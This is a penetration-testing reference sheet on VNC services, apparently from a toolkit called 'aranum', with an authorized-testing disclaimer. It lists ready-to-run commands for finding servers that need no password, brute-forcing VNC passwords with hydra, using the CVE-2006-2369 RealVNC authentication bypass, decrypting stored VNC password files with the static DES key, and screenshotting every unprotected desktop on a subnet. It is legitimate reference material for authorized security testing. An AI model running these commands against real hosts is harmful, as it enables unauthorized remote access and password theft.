---
service: vnc
title: VNC
ports: 5900-5906, 5800-5806
aliases: rfb, vncserver, tightvnc, realvnc, tigervnc
---

# VNC — quick wins

**When you see it:** 5900/tcp open (RFB protocol banner) — first check if `vnc-info` reports
`Authentication: None`; if it does, you have an interactive desktop with zero credentials.

> Authorized testing only. All techniques below are read/observe-only unless otherwise
> noted. No ✏️ actions here — VNC access is inherently interactive, so any keyboard/mouse
> input on the target constitutes a write action requiring explicit authorization.

## Triage (read-only)
```sh
nmap -sV --script vnc-info,realvnc-auth-bypass,vnc-title -p 5900-5906 H
# vnc-info: shows RFB version + offered security types (None = no auth)
# realvnc-auth-bypass: probes CVE-2006-2369
# vnc-title: grabs the desktop window title (OS/hostname hint)
```

## Quick wins

### No-auth — connect and screenshot immediately
```sh
vncviewer H::5900                                  # interactive session, no password
vncsnapshot -allowblank H:0 recon.jpg             # headless screenshot, no password
```
*Why:* when the server offers security type `None` (type 1), any client can connect.
`vnc-info` output showing `Authentication: None` is the signal.

### Brute-force weak password (VNC auth, type 2)
```sh
hydra -P /usr/share/wordlists/rockyou.txt vnc://H
nmap -p 5900 --script vnc-brute --script-args passdb=/usr/share/wordlists/rockyou.txt H
```
*Why:* VNC uses DES with a fixed key to challenge/response a password; many deployments
leave the default (`password`, `admin`, `1234`) or a short password hydra can recover in
minutes.

### CVE-2006-2369 — RealVNC auth bypass
```sh
nmap -p 5900 --script realvnc-auth-bypass H       # confirms vulnerable
# if vulnerable: connect with any password (or blank)
vncviewer H::5900
```
*Why:* RealVNC 4.1.0–4.1.1 accepts client-requested security type `None` even when the
server only advertises `VNC Authentication` — a client can downgrade and skip the
password entirely.

### Decrypt a captured stored VNC password
```sh
# password file locations: ~/.vnc/passwd (Linux), C:\Users\USER\.vnc\passwd (Windows)
# retrieve the file (via another vuln / creds), then:
vncpwd passwd                                     # prints plaintext password
```
*Why:* VNC stores passwords encrypted with DES using a static key
`[0x17,0x52,0x6b,0x06,0x23,0x4e,0x58,0x07]`; `vncpwd` (or a short Python snippet)
reverses it instantly.

### Headless screenshot sweep (no-auth hosts across subnet)
```sh
nmap -sV -p 5900 --script vnc-info H/24 -oG - | grep "Authentication: None"
vncsnapshot -allowblank VULN_HOST:0 VULN_HOST.jpg
```
*Why:* `vnc-info` exposes auth type in grepable output; combine with `vncsnapshot` to
capture the desktop of every no-auth VNC on the segment for a quick recon summary.

## aranum helpers
- `aranumtoolkit/network/enum-vnc.sh` — dispatcher that produced this finding (version
  probe, auth-type detection, CVE-2006-2369 check, title grab).

## Gotchas
- RFB 3.3 only offers one security type (chosen by the server); `None` there is genuinely
  no auth. RFB 3.7/3.8 negotiate — look at the full list, not just the first entry.
- `Too many authentication failures` — VNC daemons lock out after 3–5 failures by default;
  throttle hydra with `-t 1` and check lockout policy first.
- Web-based access on 5800/5801 (Java applet or noVNC) often shares the same auth setting —
  test both ports.
- `vncpwd` requires the raw 8-byte binary passwd file; base64-encoded versions from Windows
  registry exports need decoding first.
- CVE-2006-2369 only affects RealVNC 4.1.0–4.1.1; TightVNC, TigerVNC, and later RealVNC
  builds are not affected.

## Sources
- HackTricks `pentesting-vnc`; Hackviser VNC pentesting; Nmap NSE `realvnc-auth-bypass`;
  NVD CVE-2006-2369; Exploit-DB 36932 (RealVNC 4.1.0/4.1.1 auth bypass);
  HackingArticles VNC penetration testing.
